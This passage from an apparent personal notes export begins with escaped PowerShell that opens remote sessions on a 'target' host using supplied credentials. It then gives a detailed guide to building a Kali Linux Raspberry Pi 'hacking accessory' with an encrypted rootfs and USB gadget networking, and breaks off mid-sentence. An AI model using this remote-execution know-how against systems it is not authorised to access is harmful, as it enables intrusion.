data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Create PSCredential object for authentication.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;username&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;TARGET_USER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;password&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;TARGET_PASSWORD&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SECURE_PASSWORD&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; ConvertTo-SecureString&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;TARGET_PASSWORD&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                                          -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;AsPlainText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Force&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;CREDENTIAL_OBJECT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; New-Object&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;                   System.Management.Automation.PSCredential &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;`&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                   $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TARGET_USER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SECURE_PASSWORD&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Enter an interactive PowerShell session on the $TARGET_HOST.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Enter-PSSession&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;ComputerName &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TARGET_HOST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Credential &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;CREDENTIAL_OBJECT&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Alternately, we can pass commands directly as &quot;script&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# blocks&quot;. Note that the $POWERSHELL_SCRIPT does not have&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# access to any variables in the host script or session, as&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# its sent to $TARGET_HOST for execution (though this can be&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# worked around using the -ArgumentList parameter, if&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# necessary).&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Invoke-Command&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;ComputerName &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TARGET_HOST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;               -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Credential &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;CREDENTIAL_OBJECT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;               -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;ScriptBlock &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;{&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                    $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;POWERSHELL_SCRIPT&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                }&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Use-a-Raspberry-Pi-4B-as-hacking-accessory":{"slug":"spells/Use-a-Raspberry-Pi-4B-as-hacking-accessory","filePath":"spells/Use a Raspberry Pi 4B as hacking accessory.md","title":"Use a Raspberry Pi 4B as hacking accessory","links":["spells/SSH","spells/IPv4","spells/Wi-Fi"],"tags":["HowTo","Hardware/RaspberryPi/4B","OS/Linux/Distros/Kali","Application/MicrosoftRemoteDesktop","Application/SSH/Dropbear","Application/JumpDesktop","Hardware/iPadPro"],"content":"This guide will cover setting up Kali Linux on a Raspberry Pi 4B so that:\n\nIt can be used as a USB C “gadget” with an iPad Pro (or similar device);\nAll files except for /boot are encrypted;\nA full desktop environment is available on demand via RDP; and\nThe system still works as a desktop device in a pinch (BYO keyboard, mouse, and monitor).\n\nBe aware that this guide was written using the 64-bit 2021.2 Kali Linux image; YMMV with other images!\nIt should be possible to adapt the steps here for other Debian-based operating systems with a Raspberry Pi 4B compatible image. It should also be possible to do this all in fewer steps; the guide below is split up in a very step-by-step fashion, and is in no way optimized for speed.\nHardware and software\nThings you’ll want/need:\n\nA Raspberry Pi. (I use an 8 GB Raspberry Pi 4B.)\nA good USB C cable. (The DockCase USB C cable is surprisingly great.)\nA good microSD card. (I use a 64 GB Kingston Canvass Go! Plus.)\nA second “bootstrap” microSD card that’s at least 32 GB in size. (You need something twice the size that your operating system image requires. This will just be used to “bootstrap” the encrypted microSD card, so it’s only necessary if you’re spinning the Pi up for the first time.)\nA USB microSD card reader (since you’ll need to have both microSD cards connected to the Pi briefly.)\nPhysical access to a Linux system. (This could actually be the Pi itself, if you’ve already got it up and running with another operating system.)\nAn HDMI monitor, microHDMI-to-HDMI cable, and a USB keyboard (only needed until we set up network access and USB gadget mode).\n\nCreate the bootstrap microSD (if necessary)\nIf you’re setting the Pi up for the first time, you’ll need to burn a Kali Linux microSD card to bootstrap off of. (If you already have a working Pi, then this can be skipped.)\n# Download the latest version of Kali Linux from\n# www.kali.org/get-kali/#kali-arm. Check that page to\n# see which file name you should be using here (2021.2 is\n# current at the time of this writing).\n#\ncurl -O images.kali.org/arm-images/kali-linux-2021.2-rpi4-nexmon-64.img.xz\n \n# Check the sha256 hash to make sure you&#039;ve downloaded a good\n# file (the hash used below is for the 2021.2 image).\n#\nsha256sum kali-linux-2021.2-rpi4-nexmon-64.img.xz | \\\n\tgrep -E &quot;^97549d9e24dbd73add004b9521874dff6351a6275428356e804b98eb9e842c99 &quot; &amp;&amp; \\\n\techo &quot;SUCCESS - Download checksum looks good&quot; || \\\n\techo &quot;FAILURE - Download checksum doesn&#039;t match expected value; file corrupt or incorrect&quot;\n \n# /dev/mmcblk0 is the SD card device on my system; YMMV. Be\n# sure to use the right device here, or you can hose your\n# system! If your system automatically mounts partitions on\n# insert, then you&#039;ll need to unmount them before performing\n# this step.\n#\nxzcat kali-linux-2021.2-rpi4-nexmon-64.img.xz | \\\n\tsudo dd of=/dev/mmcblk0 bs=4M status=progress\nThere’s a small amount of free space on the Kali ROOTFS partition; it may be useful to drop any of the SSH private keys here that you’ll eventually want to use to use to log into the Pi here to make it easier to copy them into the right locations later.\nPop the microSD card out, throw it in your Pi, boot up, log in. The first-run username and password are both kali.\nWe’ll need more space in ROOTFS than the Kali image provides out-of-the-box. The kalipi-config tool can make this happen, but unfortunately it doesn’t recognize the the 64-bit images as a Raspberry Pi! To fix this, you’ll need to edit /usr/bin/kalipi-config and hack the is_pi() function so that it always returns 0. Once you’ve done this, run sudo kalipi-config and use Advanced Options → Expand Filesystem to reclaim the rest of your microSD card’s space.\nYou’re now ready to bootstrap your actual system!\nSet up the encrypted microSD sard\n# Download the latest version of Kali Linux from\n# www.kali.org/get-kali/#kali-arm. Check that page to\n# see which file name you should be using here (2021.2 is\n# current at the time of this writing).\n#\ncurl -O images.kali.org/arm-images/kali-linux-2021.2-rpi4-nexmon-64.img.xz\n \n# Check the sha256 hash to make sure you&#039;ve downloaded a good\n# file (the hash used below is for the 2021.2 image).\n#\nsha256sum kali-linux-2021.2-rpi4-nexmon-64.img.xz | \\\n\tgrep -E &quot;^97549d9e24dbd73add004b9521874dff6351a6275428356e804b98eb9e842c99 &quot; &amp;&amp; \\\n\techo &quot;SUCCESS - Download checksum looks good&quot; || \\\n\techo &quot;FAILURE - Download checksum doesn&#039;t match expected value; file corrupt or incorrect&quot;\n \n# Decompress the image. Note that you may experience I/O hangs\n# while decompressing the image; just be patient and wait for\n# the Pi&#039;s little green light to stop flashing.)\n#\nunxz kali-linux-2021.2-rpi4-nexmon-64.img.xz\n \n# Everything from here on out needs to be run as root, so\n# let&#039;s use sudo to open a root shell now.\n#\nsudo -s\n \n# Mount the partitions in the Kali disk image. Your image\n# partitions will *probably* show up as /dev/loop0p1 and\n# /dev/loop0p2, but you may want to check the symlinks under\n# /dev/disk/by-label first, just to be sure.\n#\nlosetup -Pf kali-linux-2021.2-rpi4-nexmon-64.img\nmkdir /mnt/img-{root,boot}\nmount /dev/loop0p1 /mnt/img-boot\nmount /dev/loop0p2 /mnt/img-root\n \n# Now connect up the microSD card reader and insert the first\n# microSD card and partition it. My card shows up as\n# /dev/mmcblk1 (so that&#039;s what I&#039;ll be using moving forward),\n# but you&#039;ll want to double-check this; if you use the wrong\n# device here you can hose your system!\n#\n# Delete the current partition, make sure you&#039;re using a DOS\n# partition table, and then create two new partitions:\n#\n# The first partition should be a primary partition 256MB in\n# size of type 0c (W95 FAT32 LBA).\n#\n# The second partition should also be a primary partition. It\n# should use the remainder of the space and be of type 83\n# (Linux).\n#\nfdisk /dev/mmcblk1\n \n# Format the new partitions, mount them, and copy over the\n# operating system files.\n#\nmkfs.vfat -v -n BOOT /dev/mmcblk1p1\ncryptsetup -v -y luksFormat /dev/mmcblk1p2\ncryptsetup luksOpen /dev/mmcblk1p2 crypt_rootfs\nmkfs.ext4 -v -L ROOTFS /dev/mapper/crypt_rootfs\nmkdir /mnt/ext-{root,boot}\nmount /dev/mmcblk1p1 /mnt/ext-boot\nmount /dev/mapper/crypt_rootfs /mnt/ext-root\nrsync -avh /mnt/img-boot/ /mnt/ext-boot/\nrsync -avh /mnt/img-root/ /mnt/ext-root/\n \n# You should copy your SSH public key(s) over to /mnt/ext-root \n# at this point, as you&#039;ll eventually need these to unlock the\n# Kali ROOTFS partition via dropbear. I&#039;m not writing out that\n# step explicitly though; you could be generating a new\n# keypair here, using keys you copied over to the bootstrap\n# microSD above, or just copying ~/.ssh/authorized_keys from\n# an existing system. You do you.\n \n# Make the Pi load an initramfs on boot.\n#\necho &#039;initramfs initramfs.zst followkernel&#039; &gt;&gt; /mnt/ext-boot/config.txt\n \n# Make sure the kernel knows where ROOTFS is. Note that we use\n# /dev/mmcblk0p2 here rather than /dev/mmcblk1p2, because\n# we&#039;re going to remove the current microSD card and use the\n# one we&#039;re creating in a moment, which means that on boot\n# this new card with be /dev/mmcblk0!\n#\nsed -i -e &#039;s#root=/dev/mmcblk0p2#root=/dev/mapper/crypt_rootfs cryptdevice=/dev/mmcblk0p2:crypt_rootfs#&#039; /mnt/ext-boot/cmdline.txt\n \n# Fix paths in /etc/fstab.\n#\nsed -i -e &#039;s#/dev/mmcblk0p2#/dev/mapper/crypt_rootfs#&#039; /mnt/ext-root/etc/fstab\n \n# Add ROOTFS to /etc/crypttab.\n#\necho -e &#039;crypt_rootfs\t/dev/mmcblk0p2\tnone\tluks&#039; &gt;&gt; /mnt/ext-root/etc/crypttab\n \n# Now let&#039;s actually generate the initramfs we need. Note that\n# mkinitramfs wants a (missing) kernel config, so we copy one\n# over from linux-headers as a work-around.\n#\nmount -t proc none /mnt/ext-root/proc\nmount -t sysfs none /mnt/ext-root/sys\nmount -o bind /dev /mnt/ext-root/dev\nmount -o bind /dev/pts /mnt/ext-root/dev/pts\nmount -o bind /mnt/ext-boot /mnt/ext-root/boot\nLANG=C chroot /mnt/ext-root\ncp /usr/src/linux-headers-$(uname -r)/.config \\\n   /boot/config-$(uname -r)\nmkinitramfs -o /boot/initramfs.zst $(uname -r)\nexit\n \n# Cleanup our mess.\n#\numount /mnt/ext-root/boot\numount /mnt/ext-root/dev/pts\numount /mnt/ext-root/dev\numount /mnt/ext-root/sys\numount /mnt/ext-root/proc\numount /mnt/ext-root\ncryptsetup luksClose crypt_rootfs\numount /mnt/ext-boot\numount /mnt/img-root\numount /mnt/img-boot\nlosetup -D\nrm -rf /mnt/ext-* /mnt/img-*\nexit\nNow comes the moment of truth: Shut down and unplug the Pi, remove the bootstrap microSD card and the reader, put the microSD card you just created (from the reader, with the encrypted ROOTFS) into the Pi, and then plug the Pi back in. If everything went right, you should be prompted to enter the decryption passphrase you set for the microSD card, after which boot will continue and you’ll be able to log into the desktop environment!\n(Note that the console unlock message can sometimes get lost in the initial dmesg output.)\nFirst boot\nAfter the first successful boot there’s some basic housekeeping that we should do.\n# Change the default user password.\n#\npasswd\n \n# Become root.\n#\nsudo -s\n \n# System update. DPKG may ask you some questions during this\n# process.\n#\napt update\napt full-upgrade\napt autoremove --purge --autoremove\napt clean\n \n# Update the (missing) kernel config.\n#\ncp /usr/src/linux-headers-$(ls -1 /lib/modules | grep -e &#039;-Re4son-v8l+$&#039; | sort | tail -1)/.config \\\n   /boot/config-$(ls -1 /lib/modules | grep -e &#039;-Re4son-v8l+$&#039; | sort | tail -1)\n \n# Regenerate initramfs.\n#\nmkinitramfs -o /boot/initramfs.zst \\\n\t$(ls -1 /lib/modules | grep -e &#039;-Re4son-v8l+$&#039; | sort | tail -1)\n \n# Drop permissions.\n#\nexit\nKali Linux on the Raspberry Pi isn’t configured to use swap, which makes sense because normally it’s running from a slow microSD card. Still, having some swap can aid system stability. We’re going to split the baby by enabling ZRAM.\nBegin by create /usr/local/sbin/zram.sh:\n#!/usr/bin/bash\n \ncase &quot;$1&quot; in\n\t&quot;start&quot; )\n\t\t# The &quot;-s&quot; option sets the size of the ZRAM device\n\t\t# *before* compression; ZRAM will *actually* use\n\t\t# something closer to 30% - 50% of this value, depending\n\t\t# on the compression algorithm used. As a rule of thumb,\n\t\t# set &quot;-s&quot; to be equal to the amount of RAM you actually\n\t\t# have *or* 8G, whichever is *less*.\n\t\tZRAMDEV=&quot;$(zramctl -f -s 8G -a zstd)&quot;\n\t\tmkswap $ZRAMDEV\n\t\tswapon -p 10 $ZRAMDEV\n\t;;\n\t&quot;stop&quot; )\n\t\tfor ZRAMDEV in $(awk &#039;/zram/ { print $1 }&#039; /proc/swaps); do\n\t\t\tswapoff $ZRAMDEV\n\t\t\tzramctl -r $ZRAMDEV\n\t\tdone\n\t;;\n\t&quot;restart&quot; )\n\t\t$0 stop\n\t\t$0 start\n\t;;\n\t- )\n\t\techo &quot;USAGE: $(basename &quot;$0&quot;) (start|stop|restart)&quot;\n\t;;\nesac\nThen create the systemd service file /etc/systemd/system/zram.service:\n[Unit]\nDescription=ZRAM-based virtual swap device\nRequires=systemd-modules-load.service\n \n[Install]\nWantedBy=sysinit.target\n \n[Service]\nType=oneshot\nExecStart=/usr/local/sbin/zram.sh start\nExecStop=/usr/local/sbin/zram.sh stop\nRemainAfterExit=true\nFinally, make sure that everything’s enabled.\n# Become root.\n#\nsudo -s\n \n# Make sure that the ZRAM module is loaded.\n#\necho zram &gt;&gt; /etc/modules\n \n# Make the zram.sh script executable.\n#\nchmod +x /usr/local/sbin/zram.sh\n \n# Enable required services.\n#\nsystemctl daemon-reload\nsystemctl enable zram.service\n \n# Encourage the kernel to preferentially clean up memory and\n# swap into ZRAM sooner.\n#\necho &#039;vm.vfs_cache_pressure=500&#039; &gt;&gt; /etc/sysctl.conf\necho &#039;vm.swappiness=100&#039; &gt;&gt; /etc/sysctl.conf\necho &#039;vm.dirty_background_ratio=1&#039; &gt;&gt; /etc/sysctl.conf\necho &#039;vm.dirty_ratio=50&#039; &gt;&gt; /etc/sysctl.conf\n \n# Drop permissions.\n#\nexit\nYou should reboot after doing all of this.\nNetwork access and USB gadget mode\n# Become root.\n#\nsudo -s\n \n# Install pre-requisits.\n#\napt install dnsmasq\n \n# Update firmware overlay and initramfs kernel modules.\n#\necho &#039;dtoverlay=dwc2&#039; &gt;&gt; /boot/config.txt\necho &#039;&#039; &gt;&gt; /etc/initramfs-tools/modules\necho dwc2 &gt;&gt; /etc/initramfs-tools/modules\n \n# Create /etc/network/interfaces.d/usb0.\n#\ncat &gt; /etc/network/interfaces.d/usb0 &lt;&lt; EOF\nauto usb0\nallow-hotplug usb0\niface usb0 inet static\n\taddress 10.55.0.1\n\tnetmask 255.255.255.248\nEOF\n \n# Create /etc/dnsmasq.d/ipad.\n#\ncat &gt; /etc/dnsmasq.d/ipad &lt;&lt; EOF\ninterface=usb0\ndhcp-range=10.55.0.2,10.55.0.6,255.255.255.248,1h\n \ndhcp-option=3\ndhcp-option=6\ndhcp-authoritative\nleasefile-ro\nEOF\n \n# Regenerate initramfs.\n#\nmkinitramfs -o /boot/initramfs.zst \\\n\t$(ls -1 /lib/modules | grep -e &#039;-Re4son-v8l+$&#039; | sort | tail -1)\n \n# Drop permissions.\n#\nexit\nCreate /usr/local/sbin/usb0up.sh:\n#!/bin/sh\n \nmodprobe libcomposite\n \ncd /sys/kernel/config/usb_gadget\n \nif [ ! -d pi4 ]; then\n\tmkdir -p pi4\n\tcd pi4\n \n\techo 0x1d6b &gt; idVendor  # Linux Foundation\n\techo 0x0104 &gt; idProduct # Multifunction Composite Gadget\n\techo 0x0100 &gt; bcdDevice # v1.0.0\n\techo 0x0200 &gt; bcdUSB    # USB2\n\techo 0xef   &gt; bDeviceClass\n\techo 0x02   &gt; bDeviceSubClass\n\techo 0x01   &gt; bDeviceProtocol\n \n\tmkdir -p strings/0x409\n \n\techo  fedcba9876543211 &gt; strings/0x409/serialnumber\n\techo &#039;Kali Linux&#039;      &gt; strings/0x409/manufacturer\n\techo &#039;Kali Linux&#039;      &gt; strings/0x409/product\n \n\tmkdir -p configs/c.1/strings/0x409\n \n\techo &#039;Config 1: ECM network&#039; &gt; configs/c.1/strings/0x409/configuration\n\techo  250                    &gt; configs/c.1/MaxPower\n \n\tmkdir -p functions/ecm.usb0\n \n\techo &#039;00:dc:c8:f7:75:14&#039; &gt; functions/ecm.usb0/host_addr # HostPC\n\techo &#039;00:dd:dc:eb:6d:a1&#039; &gt; functions/ecm.usb0/dev_addr  # BadUSB\n \n\tln -s functions/ecm.usb0 configs/c.1/ecm.usb0\n \n\tudevadm settle -t 5 || :\n \n\tls /sys/class/udc &gt; UDC\nfi\nCreate /usr/local/sbin/usb0down.sh:\n#!/bin/sh\n \ncd /sys/kernel/config/usb_gadget\n \nif [ -d pi4 ]; then\n\tcd pi4\n\techo &#039;&#039; &gt; UDC\n \n\trm -f configs/c.1/ecm.usb0\n \n\trmdir functions/ecm.usb0\n\trmdir configs/c.1/strings/0x409\n\trmdir configs/c.1\n\trmdir strings/0x409\n \n\tcd ..\n\trmdir pi4\n\tcd /\n \n\trmmod usb_f_ecm\n\trmmod u_ether\n\trmmod libcomposite\nfi\nThe usb0down.sh script is something you won’t find in other tutorials about setting up a Raspberry Pi in USB gadget mode. Those all focus on bringing the usb0 interface up — none cover how to tear it down successfully. Unfortunately, iPadOS 15 doesn’t like it when USB ethernet gadget goes partially down when exiting the initramfs (we’ll cover this part of things in the next section). To work around this, we need to have the ability to completely remove usb0 so that the device doesn’t exist at all when the initramfs terminates and normal userland takes over.\nNow that we can bring usb0 completely up and down, let’s tie things together. Create the systemd service file /etc/systemd/system/usb0.service:\n[Unit]\nDescription=Raspberry Pi USB C ethernet gadget mode\nBefore=network.target NetworkManager.service dnsmasq.service\nRequires=systemd-modules-load.service\n \n[Install]\nWantedBy=sysinit.target\n \n[Service]\nType=oneshot\nExecStartPre=/usr/local/sbin/usb0up.sh\nExecStart=/usr/sbin/ifup usb0\nExecStop=/usr/sbin/ifdown usb0\nExecStopPost=/usr/local/sbin/usb0down.sh\nRemainAfterExit=true\nFinally, let’s activate everything.\n# Become root.\n#\nsudo -s\n \n# Make our usb0.sh script executable.\n#\nchmod +x /usr/local/sbin/usb0up.sh\nchmod +x /usr/local/sbin/usb0down.sh\n \n# Enable required services.\n#\nsystemctl daemon-reload\nsystemctl enable dnsmasq.service\nsystemctl enable usb0.service\n \n# Drop permissions.\n#\nexit\nSecond moment of truth: Shut down the system, remove the power, and connect the Pi to your iPad over USB C. The Pi should power on, and then shortly after you unlock the ROOTFS the iPad should be assigned an IPv4 address via the ethernet device “Kali Linux”. You should then be able to SSH in as kali@10.55.0.1.\nRootFS unlock over SSH\n# Become root.\n#\nsudo -s\n \n# Install dropbear + initramfs hooks.\n#\napt install dropbear-initramfs\n \n# Align dropbear SSH host keys with OpenSSH. Normally this\n# isn&#039;t considered a best practice, but...\n#\n#     (1) We&#039;re only ever connecting to the Pi over usb0, not\n#         an open network (or, god forbid, the internet).\n#     (2) We&#039;re actually going to take steps in a moment to\n#         MAKE SURE that (1) is true.\n#\n# Since we&#039;re only connecting to the Pi via SSH over a SINGLE\n# cable, using a private IP address, and with SSH host keys\n# that are unique to this device, the danger of having these\n# keys disclosed in the event that someone got ahold of the\n# Pi&#039;s microSD card seems minimal (after all, such an attacker\n# could just trojan the initramfs.zst directly).\n#\n# (Note that you should make sure to set an EMPTY password\n# when using ssh-keygen to convert they keys to PEM format, as\n# dropbear doesn&#039;t support password-protected host keys.)\n#\ncd /etc/dropbear/initramfs\nrm -f dropbear_*_host_key\ncp /etc/ssh/ssh_host_*_key .\nfor SSH_KEY in $(ls -1 ssh_host_*_key); do\n\tDROPBEAR_KEY=&quot;$(echo &quot;$SSH_KEY&quot; | \\\n\t\tsed -e &#039;s/ssh_host_\\(.*\\)_key/dropbear_\\1_host_key/&#039;)&quot;\n\tssh-keygen -m PEM -p -f $SSH_KEY\n\tdropbearconvert openssh dropbear $SSH_KEY $DROPBEAR_KEY\n\trm -f $SSH_KEY\ndone\n \n# At this point you&#039;ll need to add your SSH public keys to\n# /etc/dropbear/initramfs/authorized_keys. I&#039;m not writing out\n# this step explicitly though; you could be generating a new\n# keypair here, using keys you copied over when setting up 